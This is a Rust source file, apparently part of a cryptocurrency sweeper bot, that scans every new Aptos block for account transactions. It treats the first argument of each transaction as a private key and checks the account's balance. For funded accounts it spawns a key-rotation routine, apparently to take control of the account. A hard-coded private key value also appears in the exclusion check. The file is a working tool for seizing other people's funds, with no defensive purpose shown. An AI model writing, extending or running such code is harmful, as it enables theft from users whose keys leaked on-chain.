use crate::rotate::rotate;
use crate::{AppState, ProcessorMessage};
use anyhow::Result;
use aptos_sdk::coin_client::CoinClient;
use aptos_sdk::rest_client::AptosBaseUrl;
use aptos_sdk::types::transaction::TransactionPayload;
use aptos_sdk::{
    crypto::ed25519::Ed25519PrivateKey, rest_client::Client as AptosClient, types::AccountKey,
};
use hex::encode;
use log::error;
use std::io::Error;
use std::sync::Arc;
use tokio::sync::watch::{Receiver};
use tokio::sync::{Mutex, mpsc};
use url::Url;

async fn check_account<'a>(
    client: Arc<AptosClient>,
    private_key_hex: Vec<u8>,
    account_bal: u64,
    parser_tx: mpsc::Sender<ProcessorMessage>,
) -> Result<bool, Error> {
    if account_bal > 1000 {
        println!("{account_bal}");
        let prvky = encode(private_key_hex).to_string().clone();
        if !prvky.eq("ae1a6f3d3daccaf77b55044cea133379934bba04a11b9d0bbd643eae5e6e9c70")
            && !prvky.eq("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
        {
            let tx_clone = parser_tx.clone();
            tokio::spawn(async move { rotate(&prvky, &client, tx_clone).await });
            Ok(true)
        } else {
            Ok(true)
        }
    } else {
        Ok(true)
    }
}

async fn check_transactions(
    item: &TransactionPayload,
    client: Arc<AptosClient>,
    parser_tx: mpsc::Sender<ProcessorMessage>,
) -> Result<bool, Error> {
    let arguments = item
        .clone()
        .into_entry_function()
        .as_entry_function_payload()
        .args
        .clone();

    if let Some(private_key_hex) = arguments.first().cloned() {
        match Ed25519PrivateKey::try_from(private_key_hex.as_slice().clone()) {
            Ok(private_key) => {
                let current_key = AccountKey::from_private_key(private_key);
                let tx_clone = parser_tx.clone();
                tokio::spawn(async move {
                    let coin_client = CoinClient::new(&client);
                    let account_address = &current_key.authentication_key().account_address();
                    let account_balance = coin_client
                        .get_account_balance(account_address)
                        .await
                        .unwrap()
                        .clone();
                    if account_balance > 0 {
                        println!("balance {:?}", &account_balance.clone());
                        check_account(client, private_key_hex.clone(), account_balance, tx_clone)
                            .await
                            .expect("Cant check");
                    }
                });
                Ok(true)
            }
            Err(e) => {
                error!("Ошибка преобразования в Ed25519PrivateKey: {:?}", e);
                Ok(true)
            }
        }
    } else {
        Ok(true)
    }
}

async fn process_transactions(
    client: Arc<AptosClient>,
    block_height: u64,
    parser_tx: mpsc::Sender<ProcessorMessage>,
) -> Result<bool, Box<dyn std::error::Error + Send + Sync>> {
    match client.get_block_by_height_bcs(block_height, true).await {
        Ok(response) => {
            tokio::spawn(async move {
                let inner = response.inner();
                if let Some(transactions) = inner.clone().transactions {
                    let filtered: Vec<TransactionPayload> = transactions
                        .into_iter()
                        .filter_map(|tx_on_chain| {
                            tx_on_chain
                                .transaction
                                .clone()
                                .try_as_signed_user_txn()
                                .cloned()
                        })
                        .filter_map(|signed_tx| match signed_tx.payload() {
                            TransactionPayload::EntryFunction(entry_func) => {
                                if entry_func
                                    .as_entry_function_payload()
                                    .module_name
                                    .contains("aptos_account")
                                {
                                    Some(signed_tx)
                                } else {
                                    None
                                }
                            }
                            _ => None,
                        })
                        .map(|tx| tx.payload().clone())
                        .collect();

                    let mut handles = Vec::new();
                    for transaction in filtered {
                        let client_clone = Arc::clone(&client);
                        let tx_clone = parser_tx.clone();
                        handles.push(tokio::spawn(async move {
                            check_transactions(&transaction, client_clone, tx_clone).await
                        }));
                    }

                    for handle in handles {
                        if let Err(e) = handle.await {
                            println!("Ошибка при обработке транзакции: {:?}", e);
                        }
                    }
                }
            });
            Ok(true)
        }
        Err(..) => Ok(false),
    }
}

pub async fn run_parser(
    state: Arc<Mutex<AppState>>,
    mut shutdown_rx: Receiver<bool>,
    parser_tx: mpsc::Sender<ProcessorMessage>,
) {
    let url_node = "http://fullnode:8080/v1";
    let node_url = Url::parse(&url_node).expect("Failed rpc_url");
    let aptos_rest_client = Arc::new(AptosClient::builder(AptosBaseUrl::Custom(node_url)).build());

    loop {
        tokio::select! {
            _ = shutdown_rx.changed() => {
                    break;
            },
            result = {
                let client_clone = Arc::clone(&aptos_rest_client);
                let current_block_height = {
                    let state_guard = state.lock().await;
                    state_guard.current_block
                };
                let tx_clone = parser_tx.clone();
                tokio::spawn(async move {
                    process_transactions(client_clone, current_block_height.clone(), tx_clone).await
                })
            } => {
                match result {
                    Ok(Ok(true)) => {
                        let mut app_state = state.lock().await;
                        app_state.current_block += 1;
                    }
                    Ok(Ok(false)) => {
                    }
                    Err(e) => {
                    },
                    Ok(Err(_)) =>{}
                }
            }
        }
    }
}
